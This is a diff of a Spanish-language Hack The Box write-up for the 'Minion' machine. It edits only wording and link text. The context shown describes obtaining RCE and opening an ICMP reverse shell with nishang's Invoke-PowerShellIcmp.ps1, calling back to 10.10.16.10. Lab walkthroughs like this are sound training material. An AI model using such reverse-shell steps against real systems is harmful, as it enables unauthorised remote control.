@@ -11,7 +11,7 @@ El dia de hoy vamos a resolver `Minion` de `hackthebox` una maquina `windows` de
     
  Maquina muy guapa asi que vamos a darle!.
 
-Comenzamos como de costumbre creando un directorio con el nombre de la maquina:
+Comenzamos como es de costumbre creando un directorio con el nombre de la maquina:
 
 ```bash
 ❯ mkdir Minion
@@ -181,7 +181,7 @@ Si ahora que tenemos `RCE` podemos tratar de enviarnos una `reverse shell` a nue
 
 Pero podriamos entablarnos una `reverse shell` por `ICMP` ya que tenemos traza con nuestra maquina, para ello vamos a usar el script `Invoke-PowerShellIcmp.ps1` del repositorio de `nishang`:
 
-* [https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellIcmp.ps1](https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellIcmp.ps1)
+* [Invoke-PowerShellIcmp.ps1](https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellIcmp.ps1)
 
 
 Cateamos el script y vemos que necesitamos ejecutar dos comandos y uno de ellos ejecuta el script `icmpsh_m.py` que necesitamos descargar.
@@ -191,7 +191,7 @@ Cateamos el script y vemos que necesitamos ejecutar dos comandos y uno de ellos 
 
 Nos descargamos el archivo y ejecutamos los comandos.
 
-* [https://github.com/bdamele/icmpsh/blob/master/icmpsh_m.py](https://github.com/bdamele/icmpsh/blob/master/icmpsh_m.py)
+* [icmpsh_m.py](https://github.com/bdamele/icmpsh/blob/master/icmpsh_m.py)
 
 
 Ahora para evitar problemas en el script `Invoke-PowerShellIcmp.ps1` vamos a quitar todos los comentarios, tambien las lineas vacias y agregar al final `Invoke-PowerShellIcmp -IPAddress 10.10.16.10`, para que al interpretarse ejecute la instrucción.
